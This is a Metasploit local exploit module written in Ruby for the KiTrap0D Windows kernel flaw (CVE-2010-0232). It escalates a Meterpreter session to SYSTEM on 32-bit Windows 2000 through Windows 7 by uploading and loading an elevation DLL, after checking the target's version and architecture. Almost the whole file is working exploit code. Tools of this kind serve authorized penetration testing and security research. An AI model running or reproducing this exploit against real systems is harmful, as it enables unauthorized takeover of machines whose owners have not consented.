##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows SYSTEM escalation via KiTrap0D',
      'Description'   => %q{
        This module will elevate the privileges of the specified session SYSTEM
        using the KiTrap0D exploit by Tavis Ormandy. If the sessions is already
        elevated, the exploit will not run.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'Tavis Ormandy', # Original resesarcher and exploit creator
          'HD Moore',      # Port of Tavis' code to meterpreter module
          'Pusscat',       # Port of Tavis' code to meterpreter module
          'OJ Reeves'      # Port of meterpreter code to a windows local exploit
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [
        [ 'Windows 2K SP4 - Windows 7 (x86)', { 'Arch' => ARCH_X86, 'Platform' => 'win' } ]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [ 'CVE', '2010-0232' ],
        [ 'OSVDB', '61854' ],
        [ 'URL', 'http://technet.microsoft.com/en-us/security/bulletin/MS10-015' ],
        [ 'URL', 'http://www.exploit-db.com/exploits/11199/' ]
      ],
      'DisclosureDate'=> "Jan 19 2010"
    ))

  end

  def check
    # Validate platform architecture
    if sysinfo["Architecture"] =~ /x64|WOW64/i
      return Exploit::CheckCode::Safe
    end

    # Validate OS version
    winver = sysinfo["OS"]
    if winver !~ /Windows 2000|Windows Vista|Windows 2003|Windows 2008|Windows 7/
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Appears
  end

  def exploit
    if is_admin? or is_system?
      fail_with(Exploit::Failure::None, 'Session is already elevated')
    end

    if check() == Exploit::CheckCode::Safe
      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system.")
    end

    library_path = ::File.join(Msf::Config.data_directory, "post", "elevate.x86.dll")
    target_path = "elevate#{rand(100000).to_s}.dll"

    load_options = {
      'LibraryFilePath' => ::File.expand_path(library_path),
      'TargetFilePath'  => target_path,
      'UploadLibrary'   => true,
      'SaveToDisk'      => false,
      'Extension'       => false
    }

    print_status("Uploading elevation binary and running the KiTrap0d exploit...")
    client.core.load_library(load_options)
    print_good("Exploit successful.")
  end
end

